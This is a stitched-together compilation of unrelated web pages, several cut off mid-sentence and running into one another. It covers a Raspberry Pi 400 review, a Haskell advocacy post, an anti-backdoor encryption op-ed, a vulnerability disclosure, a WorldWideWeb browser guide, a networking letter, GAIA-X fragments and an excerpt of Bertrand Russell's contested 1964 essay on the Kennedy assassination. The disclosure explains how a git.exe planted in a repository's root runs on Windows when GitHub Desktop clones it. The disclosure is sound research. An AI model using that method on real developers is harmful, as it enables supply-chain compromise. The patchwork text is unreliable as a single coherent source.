<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>I grew up programming on my TV, with a Sinclair ZX81 followed by a ZX Spectum. Computers built into keyboards, that you can easily plug into a TV, are part of my DNA. So, given this, how could I resist buying the new <a href="https://www.raspberrypi.org/products/raspberry-pi-400/">Raspberry Pi 400</a>!?</p>

<p>The following are my initial thoughts on the hardware, and on using it for light weight development.</p>

<p>TL;DR: I like it :)</p>

<h2 id="tech-specs">Tech Specs</h2>

<p>The Raspberry Pi 400 is, essentially, a Raspberry Pi 4 housed within a keyboard. You can read much better descriptions elseewhere, but the main points from the tech specs are:</p>

<ul>
  <li>Broadcom BCM2711 quad-core Cortex-A72 (ARM v8) 64-bit SoC @ 1.8GHz</li>
  <li>4GB LPDDR4-3200</li>
  <li>Dual-band (2.4GHz and 5.0GHz) IEEE 802.11b/g/n/ac wireless LAN</li>
  <li>Bluetooth 5.0, BLE</li>
  <li>Gigabit Ethernet</li>
  <li>2 × USB 3.0</li>
  <li>1 × USB 2.0 ports</li>
  <li>Horizontal 40-pin GPIO header</li>
  <li>2 × micro HDMI ports (supports up to 4Kp60)</li>
  <li>MicroSD card slot for operating system and data storage</li>
  <li>79-key compact keyboard</li>
</ul>

<p>(full specs can be found <a href="https://www.raspberrypi.org/products/raspberry-pi-400/specifications/">here</a>)</p>

<p>The 400 comes with a 16GB SD card pre-installed with Raspbian, and a host of apps (LibreOffice), dev tools (Geany, Mathematica, Scratch), utilities (Chromium, VLC Media Player), and games (Minecraft).</p>

<h2 id="first-impressions-on-the-hardware">First Impressions on the Hardware</h2>

<p>It was <em>very</em> easy to plug the 400 in and get it up and running. It’s a neat device, with a good collection of ports and connectors at the back. The keyboard is…ok. The device is £67 in the UK. I bought the kit (which includes a mouse, power supply, HDMI cable, and official guide) for £94. Given the price point the keyboard is absolutely fine, but it does feel a tiny bit “plasticy”.</p>

<p>The 400 doesn’t have an audio-out. Audio is delivered via the HDMI output. For me, that’s a problem because my monitor doesn’t have speakers. It’s not a BIG problem, but it’s something I hadn’t considered.</p>

<p>The other thing the 400 doesn’t have is the connector for the Raspberry Pi camera module. Again, this isn’t a big deal for me but if you were expecting to build any camera projects then the 400 isn’t the right choice.</p>

<p>The 400has the GPIO header at the back, so with a ribbon cable you can build electronics projects very easily. I have an <a href="https://www.adafruit.com/product/2028">Adafruit T-Cobbler Plus</a> which makes it very easy to connect the 400 to a breadboard and build…stuff!</p>

<p><img src="https://martinpeck.com/images/rpi400/gpio.jpg" alt="GPIO"></p>

<p>The 400 starts up quickly, and is very capable as a general purpose desktop device. I’ve spent most of today browsing the web on it, while also installing apps, running docker containers, and building code, and it’s felt fast/snappy pretty much most of the time.</p>

<p>Overall, the hardware is pretty good and I love the form factor. I can see schools/code clubs purchasing these devices and using the in their computing labs.</p>

<h2 id="developer-experience">Developer Experience</h2>

<p>I’ve spent the day setting my Raspberry Pi 400 up, and I’m pretty impressed. My setup has included:</p>

<ul>
  <li>Set up Chromium, and installed the <a href="https://1password.com/">1Password extension</a></li>
  <li>Installed <a href="https://code.visualstudio.com/">Visual Studio Code</a> using <a href="https://pimylifeup.com/raspberry-pi-visual-studio-code/">these instructions</a></li>
  <li>Installed the <a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-containers">VS Code Remote Containers extension</a> so that I can use Docker dev containers to develop code within</li>
</ul>

<p>On the whole, this setup was easy. So easy it was almost boring! I had a couple of issues, but on the whole it was very easy to set my Raspberry Pi 400 up so that I can write code, use Docker, and push changes to GitHub. For example, I’m currently writing this blog post within VS Code, building it using <a href="https://jekyllrb.com/">Jekyll</a> within a Docker container.</p>

<p>The only issue that I hit is the ARM support for various Docker images. The default Ruby dev container image wouldn’t build because it had some dependencies that didn’t have ARM variants. In the end I took the Ruby 2.7 docker image as a base, and copy/pasted into my own <code>Dockerfile</code> the parts of the defintion I needed (removing Node, Zsh, Oh my Zsh and a few other things). I’m not sure exactly what it was that was failng to build, so I need to go back and work it out, but it’s worth remembering that if the Rasberry Pi is ARM based, and not all development tools have ARM builds.</p>

<p>Having installed tools, and played around, I’ve built some very basic Rust code (with build times comparible to my MacBook!), I’ve written some <a href="https://gpiozero.readthedocs.io/en/stable/">GPIOZero</a> based Python 3 code (controlling butons and LEDs), and I’ve set up a Jekyll/Ruby dev container and built/updated my blog.</p>

<h2 id="conclusion">Conclusion</h2>

<p>I own several Raspberry Pi computers (1, 2 and 3). Most of them are the Model B format, but I have couple of Zeros too. All of them sit in a box, unused. I’ve played with them, then put them away. Part of that is because the performance hasn’t been that great, but the form factor is a major factor. It feels like the Raspberry Pi 400 has the power I need (for casual projects), and comes in a form factor that I can happily leave plugged in on my desk.</p>

<p>On top of that…it gives me a massive nostalgia rush using it!</p>

<p><img src="https://martinpeck.com/images/rpi400/desktop.jpg" alt="GPIO"></p>

<p>In the picture below I have two instances of VS Code (both running dev containers), plus I’m browsing. It takes it all in its stride.</p>

<p><img src="https://martinpeck.com/images/rpi400/pi-400-desktop.png" alt="GPIO"></p>

<p>I’ve not tried building anything huge…but that’s not what it’s for. It’s for having fun…</p>

<p>…and I’m <strong>absolutely having fun</strong>!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.

                <div>
                    <p>Wars can be fought in the real world but there is also a virtual battlefield - and it is just as harmful. The <a href="https://www.judiciary.senate.gov/press/rep/releases/graham-cotton-blackburn-introduce-balanced-solution-to-bolster-national-security-end-use-of-warrant-proof-encryption-that-shields-criminal-activity">Lawful Access to Encrypted Data Act</a> is the latest attempt to access people's encrypted data and it serves as another reinforcement.</p><blockquote>This type of “warrant-proof” encryption adds little to the security of the communications of the ordinary user, but it is a serious benefit for those who use the internet for illicit purposes.</blockquote><p>This statement is plainly false. Encryption has as much benefit, if not more, for ordinary users. Encryption is used in every website that has the padlock sign (HTTP<strong>S</strong>), in every iPhone app since 2016, in every Android app since 2018 and in almost every modern application - and for good reason. Encryption helps protect sensitive information (such as that shared with your bank, or any time you use a password on a website). It may also help protect files which are not in use (at rest), or in the event the server is accessed by an unauthorised person (such as a criminal attempting to siphon off important data).</p><p>In 2016, Bruce Schneier wrote an article on <a href="https://www.schneier.com/essays/archives/2016/04/the_value_of_encrypt.html">the value of encryption</a> clearly outlining why encryption is needed. Schneier went on to say that when the US Government was <a href="https://blog.privacytools.io/us-government-wages-war-on-encryption/">previously</a> <a href="https://en.wikipedia.org/wiki/Crypto_Wars">fighting cryptography</a>, he wondered if they were aware how much they relied on it themselves. No-one is above the law, so if you ban strong encryption, the FBI should not use it either. Attorney General Barr, <a href="https://www.theregister.com/2019/07/23/us_encryption_backdoor/">gives the impression</a> that the government, along with certain large companies, should have an exception to the law. Barr recognises that there are some things that are secret, but he doesn't recognise that regular citizens might also want to enjoy privacy as well.</p><blockquote>“We are not talking about protecting the nation’s nuclear launch codes,” Barr told the International Conference on Cyber Security at Fordham University.</blockquote><blockquote>“Nor are we necessarily talking about the customized encryption used by large business enterprises to protect their operations. We are talking about consumer products and services such as messaging, smart phones, email, and voice and data applications."</blockquote><p>Somehow, because your average Joe does not have government level secrets, he is no longer entitled to encryption. We are all humans, and we all need privacy. By taking away encryption, you are taking away privacy online.</p><p>This act is aimed at Section 230, which ensures that no interactive computer service provider shall be treated as the publisher or speaker of content published by their users - an essential part of the survival of all search engines, social media platforms and video sharing sites. Without it, the internet would become a self-censored platform – one that is more concerned with fending off lawsuits than providing a medium for ideas and innovation as it originally was.</p><p>It is easy to sympathise with an act that is being pushed through on the grounds that terrorists, paedophiles and drug-dealers all use encryption. Reading the <a href="https://www.nytimes.com/interactive/2019/09/28/us/child-sex-abuse.html">New York Times</a>' <a href="https://www.nytimes.com/2020/02/19/podcasts/the-daily/child-sex-abuse.html">reporting</a> on online images of &nbsp;sexual abuse would leave some wondering why this sort of Act has not been passed already. Equally, if no-one had encryption then it would certainly be easier to catch above mentioned crooks and fellons.</p><p>Encryption, however, did not create these problems; these crimes were around long before it came into existence. In addition, those who partake in illicit activity will always find loopholes and ways to do so, such as using products or encryption tools that don't have backdoors. Criminals do not obey laws by definition. Furthermore, many innocent people use similar encryption to these criminals, but only to protect privacy, not hide any illegalities and yet they could still be subject to some kind of prosecution. It is assumed the use or possession of non-backdoored software would also become an offence if too many people used that instead. Statistically, it's agreed there are many more innocent people in society than criminals; those innocent people would be punished as a result of the bad actions of a few.</p><p>It is not feasible for a government to make a law of this sort that can apply outside of it's own country. Governments around the world would almost certainly disagree on which countries should be allowed access to the backdoor. As a result, this backdoor would most certainly lead to every unauthorised party having access, as the key to decrypt the data would be discovered by third parties, this would result in completely broken encryption for all. In federated networks, such as Matrix, it's not even possible to add a backdoor to every homeserver. Federation decentralises trust, which means that the person deploying the server isn't necessarily the same entity who makes the client software or server software. Matrix has even written a <a href="https://matrix.org/blog/2020/10/19/combating-abuse-in-matrix-without-backdoors">thorough article</a> on how to combat this sort of abuse without backdoors. </p><p>Weakening encryption will only result in criminals using strong encryption anyway, without fighting any of the problems that the the law claims to solve. There is no easy solution, and it is down to politicians to provide one. Yes, encryption can be used by people with bad intentions, but it is also used by so many ordinary people who would never think to use it in a malicious way. Nearly every tool in life can be used for nefarious purposes, but does not mean it should be unavailable for legitimate non-criminal uses. You could hit someone with a hammer, but it doesn't mean hammers should be made out of foam, because if they were, people would just use knives instead. Weakening encryption will not solve these issues, and that's probably because they were not the the focus of the Act. Instead, it seems that this law seeks to criminalises strong encryption that does not have backdoors, even though the government knows full well that this will not stop criminals. The US Government should stop devising new ways to breach its citizens privacy, and focus on combating the issues that this Act fails to.</p><p>In 1988, Timothy May <a href="https://activism.net/cypherpunk/crypto-anarchy.html">predicted</a> that “the State will of course try to slow or halt the spread of [encryption], citing national security concerns, use of the technology by drug dealers and tax evaders, and fears of societal disintegration”. He was spot on.</p><p><em>Cover artwork by <a href="https://setofprinciples.com/">Zan</a></em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h4 id="introduction">Introduction</h4>
<p>This post is a rather unusual story of a vulnerability that could be leveraged as a supply chain attack and used to attack millions of software developers around the world. It is also a tale of a bug collision that paid a bounty to one reporter and assigned the CVE to another!</p>
<p>The main focus of this blog post is GitHub Desktop. Other Git clients such as GitKraken, Git-Tower and SourceTree were also found to be vulnerable, however these have different exploitation scenarios that require user interaction.</p>
<h4 id="briefdescriptionoftheissue">Brief description of the issue</h4>
<p>As part of GitHub Desktop's default repository cloning process, among other actions it calls the executable git-lfs.</p>
<p>From git-lfs's official page "Git Large File Storage (LFS) replaces large files such as audio samples, videos, datasets, and graphics with text pointers inside Git, while storing the file contents on a remote server like GitHub.com or GitHub Enterprise."</p>
<p>git-lfs is then called on the current cloned repository, already present in disk.</p>
<p>A vulnerability was discovered when cloning a repository with a especially crafted file in the root directory. Upon cloning such malicious repository, code execution is achieved with the same privileges as the affected user running GitHub Desktop.</p>
<p>When inspecting the desktop application under Proccess Monitor, it was noticed several actions of git-lfs called a git executable from inside the newly cloned repository.</p>
<p><img src="https://blog.blazeinfosec.com/content/images/2020/11/procmon.PNG" alt="procmon"></p>
<p>By placing a malicious git in the root of the malicious repo, a user that clones it will have the malicious git executed by git-lfs, all of this behind the scenes and transparent to the user.</p>
<p>The cloning process happens normally and there is no visual indication that a malicious binary was ran instead of the original git executable.</p>
<h4 id="rootcauseanalysis">Root cause analysis</h4>
<p>We attempted to understand the root cause of this vulnerability by reading git-lfs's code. The authors of this write-up tried to put together as much information as possible in order to understand the cause of the problem.</p>
<p>From <a href="https://github.com/git-lfs/git-lfs/blob/master/commands/command_clone.go">https://github.com/git-lfs/git-lfs/blob/master/commands/command_clone.go</a></p>
<p>From line 23:</p>
<pre><code>func cloneCommand(cmd *cobra.Command, args []string) {
	requireGitVersion()

	if git.IsGitVersionAtLeast("2.15.0") {
		msg := []string{
			"WARNING: 'git lfs clone' is deprecated and will not be updated",
			"          with new flags from 'git clone'",
			"",
			"'git clone' has been updated in upstream Git to have comparable",
			"speeds to 'git lfs clone'.",
		}

		fmt.Fprintln(os.Stderr, strings.Join(msg, "\n"))
	}
</code></pre>
<p>The function above seems to be called when a clone action takes place. Right in the beginning the function calls requireGitVersion() and then checks whether the version is at least 2.15.0.</p>
<p>From <a href="https://github.com/git-lfs/git-lfs/blob/master/commands/commands.go">https://github.com/git-lfs/git-lfs/blob/master/commands/commands.go</a></p>
<p>Line 537:</p>
<pre><code>func requireGitVersion() {
	minimumGit := "1.8.2"

	if !git.IsGitVersionAtLeast(minimumGit) {
		gitver, err := git.Version()
		if err != nil {
			Exit("Error getting git version: %s", err)
		}
		Exit("git version &gt;= %s is required for Git LFS, your version: %s", minimumGit, gitver)
	}
}
</code></pre>
<p>It calls !git.IsGitVersionAtLeast(minimumGit) which can be found in <a href="https://github.com/git-lfs/git-lfs/blob/master/git/version.go">https://github.com/git-lfs/git-lfs/blob/master/git/version.go</a></p>
<p>From line 28:</p>
<pre><code>func IsGitVersionAtLeast(ver string) bool {
	gitver, err := Version()
	if err != nil {
		tracerx.Printf("Error getting git version: %v", err)
		return false
	}
	return IsVersionAtLeast(gitver, ver)
}
</code></pre>
<p>Version() can be found in the same file version.go on line 18:</p>
<pre><code>func Version() (string, error) {
	gitVersionOnce.Do(func() {
		gitVersion, gitVersionErr =
			subprocess.SimpleExec("git", "version")
	})
	return gitVersion, gitVersionErr
}
</code></pre>
<p>The function calling chain is the following:<br>
cloneCommand() -&gt; requireGitVersion() -&gt; IsGitVersionAtLeast() -&gt; Version()</p>
<p>We can see that in line 21 in version.go, there is inside the function Version() a call to subprocess.SimpleExec() - it executes the git binary with the argument "version".</p>
<p>There is an implicit assumption from git-lfs that by executing an external binary, the operating system will first look it up from the system's PATH environment variable. This is the true root cause of the vulnerability.</p>
<p>Calling the subprocess 'git' works as intended in GitHub Desktop for MacOS. In Windows, however, the search order favors the current directory first and only then it searches in the order specified in PATH.</p>
<h4 id="exploitation">Exploitation</h4>
<p>By copying calc.exe, renaming it to git.exe and committing/pushing it into the root of the repository, the attacker sets up the crafted repository that will be used to later exploit users.</p>
<p>When a developer clones this repository using GitHub Desktop for Windows, its subcomponent git-lfs will work on the cloned folder as its current directory, meaning all subsequent calls to the binary 'git' will be instead calling the malicious git.exe not the one present in the PATH.</p>

<p>The vulnerability was simultaneously discovered and researched by <a href="https://twitter.com/Rapt00rVF">Vitor Fernandes</a> and Julio Fort of Blaze Information Security. The independent researcher Dawid Golunski (dobra robota, amigo!) apparently discovered the issue a few days earlier and submitted it to MITRE, while Vitor submitted it to GitHub's bug bounty.</p>
<p>Vitor collected the bounty from GitHub's program on HackerOne as his report arrived earlier and Dawid was assigned the CVE.</p>

<section>
	<h2>WorldWideWeb</h2>
	<div>
		<p>The idea of hypertext preceded the World Wide Web by decades. But nearly all hypertext systems worked on local files. Tim Berners-Lee wanted to create a system that would work across networks so that people could link from a file on one machine to another file on another machine.</p>
		<p>WorldWideWeb wasn't just a programme for browsing files. It was a browser and editor. The introductory text reads:</p>
		<blockquote>HyperMedia Browser/Editor, An excercise in global information availability by Tim Berners-Lee</blockquote>
		<p>Today it's hard to imagine that web browsers might also be used to create web pages. It turned out that people were quite happy to write HTML by hand—something that Tim Berners-Lee and colleagues never expected. They thought that some kind of user interface would be needed for making web pages and links. That's what the WorldWideWeb browser provided. You could open a document in one window and "mark" it. Then, in a document in another window, you could create a link to the marked page.</p>
		<p>You'll notice as you use the WorldWideWeb browser that you need to double-click links to open them. That's because a single click was used for editing.</p>
	</div>
</section>

<section>
	<h2>Browsing</h2>
	<div>
		<p>The user interface of the WorldWideWeb browser somewhat blurred the lines between documents on your own computer and documents out on the network. To "browse" directly to a document out on the network, you need to know its URL. But you can't simply type that URL into an address bar; there is no address bar. Instead you have to follow a sequence of steps:</p>
		<ol>
			<li>From the "WorldWideWeb" menu, select "Document".</li>
			<li>Now from the newly-opened "Document" menu, select "Open from full document reference".</li>
			<li>Type the URL into the field marked "reference".</li>
			<li>Press the "Open" button</li>
		</ol>
		<p>Once you've got a web-based document (or web page, as we would say today) open in WorldWideWeb, you can navigate by double-clicking on links. Every link you double-click will open in a new window.</p>
	</div>
</section>

<section>
	<h2>Linking</h2>
	<div>
		<p>At its heart, WorldWideWeb is a word processor …but with links. And just as you <em>can</em> use a word processor purely for reading documents, the real fun comes when you write your own. Especially when you throw hyperlinks into the mix.</p>
		<p>To create a document:</p>
		<ol>
			<li>From the "WorldWideWeb" menu, select "New File..."</li>
			<li>Type the name of the file you want to create e.g. example.html</li>
			<li>In the boilerplate document, click on the heading to edit. Same with the text.</li>
		</ol>
		<p>Once you've got a document written, it's time to turn from regular text into <em>hyper</em>text:</p>
		<ol>
			<li>From the "WorldWideWeb" menu, select "Links"</li>
			<li>To link to another document, you need to have that other document open in another window. Click on its title bar to focus it.</li>
			<li>With that document in focus, select "Mark all" from the "Links" menu.</li>
			<li>Now switch back to your example.html document and highlight the text you want to be a link.</li>
			<li>From the "Links" menu, select "Link to marked".</li>
		</ol>
		<p>You can even save your new document on to your hard drive. Click on "Save a copy offline" under the "Documents" menu.</p>
		<p>Once you've downloaded the file to your computer, you can open it up with a text editor to see what the HTML would have looked like.</p>
	</div>
</section>

<section>
<h2>Editing</h2>
<div>
	<p>To edit any document, whether it's one you created, or a page on the world wide web:</p>
	<ol>
		<li>Click on the text you want edit.</li>
		<li>Edit it.</li>
	</ol>
	<p>That's it.</p>
	<p>If you want to keep a copy of the edited document, choose "Save a copy offline" from the "Documents" menu.</p>
	</div>

		<p>Dear new developer,</p>
<p>Work on your network. It will help you in numerous ways as you progress in your career. Whatever you are looking for: a new job, to hire someone, to get a mentor, to learn about a new technology, having a list of people that you know and/or have worked with that you can reach out to will help you accomplish your goals.</p>
<p>But it can be tough, especially if you are awkward around people. I am awkward around people and learned how to be less awkward. My main technique is to both give and ask for a “hook” in any conversation I start.</p>
<p>Here’s a typical “networking” conversation of which I’ve had many:</p>
<p>Dan: Hi, I’m Dan.</p>
<p>Jan: Hi, I’m Jan.</p>
<p>Dan: Where do you work?</p>
<p>Jan: I work at Company X. Where do you work?</p>
<p>Dan: Company Y.</p>
<p>&lt;crickets&gt;</p>
<p>Compare that with this conversation:</p>
<p>Dan: Hi, I’m Dan.</p>
<p>Jan: Hi, I’m Jan.</p>
<p>Dan: Where do you work?</p>
<p>Jan: I work at Company X. Where do you work?</p>
<p>Dan: Company Y. We recently launched website Z and are evaluating technology ABC. What has your company recently rolled out?</p>
<p>See the difference? Dan has provided Jan with two avenues for conversation–one is asking further about technology ABC or website Z, and the other is talking about Company X. Jan can decide where to take the conversation, but Dan has provided the start of it.</p>
<p>Learning this trick, which comes naturally to many many people, changed the way I network. Another thing that mattered was my realization that everyone, every single person, has an interesting story or anecdote to tell, and that I can learn something. That understanding has made conversation much more fun.</p>
<p>Sincerely,</p>
<p>Dan</p>

Many dialogues are already underway and will be further intensified. Furthermore, GAIA-X is in continuous exchange with the European Commission.</p> <p>Europe makes extensive investments in digital technologies and innovative business models. We must ensure that those who drive innovations forward are also those who benefit in economic terms. This will help to secure value creation and employment in Europe.<br> An open digital ecosystem is needed to enable European companies and business models to compete globally. This ecosystem should allow both the digital sovereignty of cloud services users and the scalability of European cloud providers.</p> <p>Within the GAIA-X project, we are developing the foundations for a federated, open data infrastructure based on European values. ‘Project GAIA-X’ connects centralised and decentralised infrastructures in order to turn them into a homogeneous, user-friendly system. The resulting federated form of data infrastructure strengthens the ability to both access and share data securely and confidently.</p> </div> </div>  </div> </div> <div id="id2112282" role="listbox" data-slider-speed="5000" data-slider-speed-auto="4000"> <div> <div> <figure> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=530w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=768w"> <source media="(max-width: 1039px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=1024w"> <source media="(max-width: 1311px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=1260w"> <source media="(min-width: 1312px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=1900w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=1900w" title="Gaia-X" alt="Gaia-X"> </picture> <figcaption> <p> © ... </p> </figcaption> </figure>  </div>  </div> </div> <div id="id1839162" tabindex="-1"> <div> <div> <p> <span>We invite you to participate in GAIA-X</span> </p> <h2> Together for a European Data Infrastructure </h2> </div>  </div> <div> <div> <div> <p>We are banking on Europe’s enduring strengths.

In this way, we link up the many investments in digital technologies made throughout Europe, enabling them to unfold an even greater effect.</p> <h3>Open for further participation</h3> <p>GAIA-X is defined by openness and transparency. The openness to national and European initiatives with similar objectives as GAIA-X gives the project a strong momentum for joint European cooperation. Building upon existing solutions and their further development, we want to launch competitive offers from Europe out onto the world market.</p> <p>More than 300 organizations from various countries are already involved in GAIA-X. Still, the project is open to new European interested parties to join us in its development. Participation in the project is also possible for market participants outside Europe who share our goals of data sovereignty and data availability.</p> <p>We welcome all interested parties who want to contribute their domain-specific and technical requirements and who want to actively participate: Both by contributing technical expertise, by submitting new use cases and by an active and continuous participation in a working group.

<div> <div> <p> <span>Technical Concept</span> </p> <h2> How does GAIA-X work? </h2> </div>  </div> <div> <div> <div> <p>Federated services provide value if they are based on common standards which ensure transparency and interoperability. GAIA-X addresses this requirement by aligning network and interconnection providers, Cloud Solution Providers (CSP), High Performance Computing (HPC) as well as sector specific clouds and edge systems. Here, mechanisms are developed to find, combine and connect services from participating providers in order to enable a user-friendly infrastructure ecosystem. GAIA-X identifies the minimum technical requirements and services necessary to operate the federated GAIA-X Ecosystem. The development of these services will follow the principles of Security by Design and also include the concept of Privacy by Design in order to ensure highest security requirements and privacy protection.</p> <p>Technical implementation of these Federation Services will focus on the following areas:</p> <ul><li>the implementation of secure federated identity and trust mechanisms (security and privacy by design);</li><li>sovereign data services which ensure the identity of source and receiver of data and which ensure the access and usage rights towards the data;</li><li>easy access to the available providers, nodes and services. Data will be provided through federated catalogues; </li><li>the integration of existing standards to ensure interoperability and portability across infrastructure, applications and data; </li><li>the establishment of a compliance framework and Certification and Accreditation services; and</li><li>the contribution of a modular compilation of open source software and standards to support providers in delivering a secure, federated and interoperable infrastructure.</li></ul> <p>The initial set of federation services will be expanded. The roadmap is aligned with the development of ecosystem participants’ requirements.</p> </div> </div> </div> </div> <div id="id1839168" tabindex="-1"> <div> <div> <p> <span>GAIA-X in practice</span> </p> <h2> Use Cases: GAIA-X from the user perspective </h2> </div> <p>GAIA-X gives users access to a broad and highly useful range of specialised products and services from cloud providers, thus enabling the use of tailored solutions. In this context, GAIA-X offers full transparency through the self-description, provides certified data protection and supplies regulatory criteria for the products and services offered.</p>  </div> <div> <div> <div> <p>Clear conditions for participation in GAIA-X and for collaboration, and common rules for cross-company authentication and access management will strengthen the underlying level of trust, bring down the obstacles to participation and reduce the amount of work involved in bilateral coordination between individual users.</p> <p>A further important added benefit of GAIA-X is the guarantee of data sovereignty: Each user decides for herself where her data is stored, as well as who may process it and for what purpose, based on the user’s own data classification. In that sense GAIA-X enables modular solutions. Users can also access AI applications and data pools via the trustworthy data infrastructure. Based on standardisation rules and the different options for managing and controlling the transfer of data, data can be exchanged between the companies, linked with other data, processed, evaluated, and monetised in value creation networks. The opportunities of data and service sharing can promote innovations, exploit synergies and enable new business models to be developed and scaled up. </p> <p>The aim of Workstream 1 ‘User ecosystems and requirements’ is to achieve the stated added benefits through a broad and sustained mobilisation of the user and demand perspective. This occurs through continual identification, integration, development and implementation of domain-specific use cases, which illustrate the need for and the added benefit of a sovereign European data infrastructure. The work also focuses on defining domain-specific and cross-domain requirements. These form the foundation for the growth of data infrastructures.</p> <p>In the meantime, more than 40 use cases have been submitted in eight domains (‘Industry 4.0/SME’, ‘Health’, ‘Finance’, ‘Public Sector’, ‘Smart Living’, ‘Energy’, ‘Mobility’ and ‘Agriculture’). They come from various companies and organisations from European countries, including Germany, France, the Netherlands, Spain and Switzerland.

            <h2>By Bertrand Russell</h2>
            <p>[Originally published in: <strong><cite>The Minority of One</cite>, 6 September 1964, pp.6–8.</strong>]</p>
            <p>The official version of the <a href="http://22november1963.org.uk/" title="John F. Kennedy assassination">assassination of President Kennedy</a> has been so riddled with contradictions that it is been abandoned and rewritten no less than three times. Blatant fabrications have received very widespread <a href="http://22november1963.org.uk/the-media-and-the-jfk-assassination" title="Media coverage of the JFK assassination">coverage by the mass media</a>, but denials of these same lies have gone unpublished. Photographs, evidence and affidavits have been doctored out of recognition. Some of the most important aspects of <a href="http://22november1963.org.uk/how-did-oswald-kill-kennedy" title="The case against Lee Harvey Oswald">the case against Lee Harvey Oswald</a> have been completely blacked out. Meanwhile, the F.B.I., the police and the Secret Service have tried to silence key witnesses or instruct them what evidence to give. Others involved have disappeared or died in extraordinary circumstances.</p>
            <p>It is facts such as these that demand attention, and which the <a href="http://22november1963.org.uk/warren-commission-jfk-assassination" title="The Warren Commission's investigation of the JFK assassination">Warren Commission</a> should have regarded as vital. Although I am writing before the publication of the Warren Commission’s report, leaks to the press have made much of its contents predictable. Because of the high office of its members and the fact of its establishment by President Johnson, the Commission has been widely regarded as a body of holy men appointed to pronounce the truth. An impartial examination of the composition and conduct of the Commission suggests quite otherwise.</p>
            <h2>1: Membership of the Warren Commission</h2>
            <p>The Warren Commission has been utterly unrepresentative of the American people. It consisted of:</p>
            <ul>
                <li>two Democrats, <a href="http://22november1963.org.uk/richard-russell-warren-report" title="Senator Richard Russell's objection to the Warren Report">Senator Russell of Georgia</a> and Congressman Boggs of Louisiana, both of whose racist views have brought shame on the United States;</li>
                <li>two Republicans, Senator Cooper of Kentucky and Congressman Gerald R. Ford of Michigan, the latter of whom is a leader of his local Goldwater movement and an associate of the F.B.I.;</li>
                <li>Allen Dulles, former director of the Central Intelligence Agency,</li>
                <li>and Mr. McCloy, who has been referred to as the spokesman for the business community.</li>
            </ul>
